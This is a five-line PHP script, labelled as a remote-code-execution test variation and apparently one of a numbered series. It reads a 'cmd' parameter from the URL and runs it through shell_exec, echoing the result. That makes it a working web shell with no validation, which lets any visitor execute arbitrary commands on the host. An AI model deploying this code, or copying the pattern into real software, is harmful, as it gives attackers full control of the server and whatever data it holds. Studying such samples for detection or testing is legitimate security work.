<?php
// RCE test variation #1355
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>